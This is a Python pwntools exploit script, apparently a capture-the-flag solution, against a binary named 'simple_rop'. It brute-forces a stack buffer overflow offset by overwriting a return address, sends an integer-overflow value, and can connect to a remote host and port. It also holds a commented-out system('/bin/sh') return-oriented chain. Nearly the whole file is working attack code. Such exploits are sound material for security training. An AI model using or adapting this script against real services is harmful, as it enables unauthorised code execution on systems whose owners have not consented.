#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './simple_rop'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

system = elf.symbols['system']
binsh = 0x804a050
main = 0x804864B

flag = 0

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def exp(p,offset):        
    global flag
    # offset = 34
    payload = 'A'*offset
    # payload += p32(system) + p32(main) + p32(binsh)
    payload += p32(main)

    ru('Rop\n')
    sl(payload)
    sleep(1)
    ru('cursor: \n')
    # debug('b *0x8048785')
    sl('-2147483648')

    sleep(0.5)

    data = rc(1000)
    log.success(data)
    if 'You need search Rop' in data:
        log.success("right! offset="+str(offset))
        flag = 1
    else:
        log.warning("fail!  offset="+str(offset))

#  v6  off
#  0   36
#  2   34
#  32  4
offset = 36
while flag==0:
    if len(sys.argv) == 1:
        is_local = True
        p = process(local_file)
        libc = ELF(local_libc)
    elif len(sys.argv) > 1:
        is_remote = True
        if len(sys.argv) == 3:
            host = sys.argv[1]
            port = sys.argv[2]
        else:
            host, port = sys.argv[1].split(':')
        p = remote(host, port)
        libc = ELF(remote_libc)
    exp(p,offset)
    offset -= 1
    if offset <= 0:
        break

